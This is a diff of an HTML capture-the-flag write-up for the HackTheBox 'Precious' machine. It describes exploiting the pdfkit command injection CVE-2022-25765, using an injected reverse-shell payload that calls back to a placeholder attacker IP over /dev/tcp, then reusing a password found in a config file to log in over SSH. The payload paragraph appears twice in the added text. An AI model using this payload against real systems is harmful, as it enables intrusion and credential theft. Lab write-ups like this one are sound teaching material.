@@ -92,7 +92,7 @@
             <br>Added the IP to /etc/hosts bound to precious.htb and visited the WebPage. Seems like a converter for Web Pages to a PDF File through an URL.
             <br>Tested it with a http-link to my Website but got following Error Message:</p>
             <br>
-            <img src="/Website/writeups/HTB/PRECIOUS/media/PRECIOUS2.png" alt="website" class="center">
+            <img src="/Website/writeups/HTB/PRECIOUS/media/PRECIOUS2.png" alt="Picture" class="center">
             <br>
             <br>
             <p>
@@ -105,7 +105,7 @@
             <br>Et voilà, <md> http://%00 </md> downloaded an empty PDF! But I didnt find a way to get a pdf with some content.
             <br>Then I took a look at the PDF-Creator trough the Browser Console: </p>
             <br>
-            <img src="/Website/writeups/HTB/PRECIOUS/media/PRECIOUS3.png" alt="website" class="center">
+            <img src="/Website/writeups/HTB/PRECIOUS/media/PRECIOUS3.png" alt="Picture" class="center">
             <br>
             <br>
             <p> pdkit v0.8.6
@@ -117,16 +117,21 @@
             <h3>== CVE-2022-25765 ==</h3>
             </p>
             <p>This vulernability is about Command Injection as the URL is not properly sanitized.
-            <br>Found an&nbsp <a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795">PoC</a> on snyk's Website. And came up with following Payload:  <p-js> http://example.com/?name=#{'%20`bash -c "/bin/bash -i >&amp; /dev/tcp/[ATTACKER IP]/[PORT] 0>&amp;1"`'} </p-js>
+            <br>Found a <a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795">PoC</a> on snyk's Website. And came up with following Payload:  <p-js> http://example.com/?name=#{'%20`bash -c "/bin/bash -i >&amp; /dev/tcp/[ATTACKER IP]/[PORT] 0>&amp;1"`'} </p-js>
             <br>Spun up a netcat listener and catched a reverse shell! </p>
             <br>
-            <img src="/Website/writeups/CSRv2022/media/PDFCARNAGEINPUTFILTER.png" alt="website" class="center">
             <br>
-            <p>Not so cool... <br>After trying several different methods to gain xss I realized that this is not gonna happen and my input will always be detected as dangerous, no workaround for the filter... </p>
-            <p>But my input isnt the only thing that gets reflected in the pdf, so what about the user agent? <br>Setting my user-agent to:&nbsp &nbsp <p-js>&lt;img src="https://i1.sndcdn.com/artworks-000599808744-91k9x2-t500x500.jpg"></p-js>Worked! </p>
+            <p>
+            <h3>== User Flag ==</h3>
+            </p>
+            <p> Since pdfkit is written in ruby and the backendservice executed my payload, i operated as "ruby-user" in the reverse shell.
+            <br>So I tinkered round a little bit, and found a user called "Henry", but wasnt able to read the user.txt at /home/henry/user.txt.
+            <br>With '<md> grep "henry" -r 2>/dev/null </md>' I found a config-file in '<md> /home/ruby/.bundle/ </md>' containing henrys password!
+            <br>Started a ssh-session as henry and got the user flag.
+            <br>Found a <a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795">PoC</a> on snyk's Website. And came up with following Payload:  <p-js> http://example.com/?name=#{'%20`bash -c "/bin/bash -i >&amp; /dev/tcp/[ATTACKER IP]/[PORT] 0>&amp;1"`'} </p-js>
+            <br>Spun up a netcat listener and catched a reverse shell! </p>
             <br>
-            <img src="/Website/writeups/CSRv2022/media/PDFCARNAGEHACKERMAN.png" alt="website" class="center">
-            <br>
+            <img src="/Website/writeups/HTB/PRECIOUS/media/PRECIOUS4.png" alt="website" class="center">
             <br>
             <br>
             <p>
